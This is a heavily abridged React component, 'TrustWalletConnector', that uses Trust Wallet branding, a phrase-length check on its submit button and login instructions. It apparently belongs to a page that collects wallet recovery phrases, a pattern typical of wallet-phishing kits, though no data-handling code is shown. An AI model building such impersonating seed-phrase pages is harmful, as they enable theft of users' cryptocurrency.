...
import logo from "../../assets/trust_dark.png";
...
const TrustWalletConnector = () => {
  ...
  return (
    <div className="min-h-screen bg-black text-gray-100 w-full mt-11">
      ...
      {loading && (
        <LoadingModal type={"TrustWallet"} onClose={() => setLoading(false)} />
      )}
        ...
        <div className="grid md:grid-cols-2 gap-8">
          ...
          <div className=" p-6">
            <div className="mb-6">
              <div className="flex items-center gap-3 mb-6">
                ...
                <h2 className="text-2xl font-semibold">TrustWallet</h2>
              </div>
            ...
            <div className="space-y-6">
              ...
              <button
                ...
                disabled={!phraseLength || isPending}
          ...
          <div className="bg-black rounded-lg p-6">
            ...
            <ol className="space-y-4">
              {[
                "Log in to your TrustWallet account",
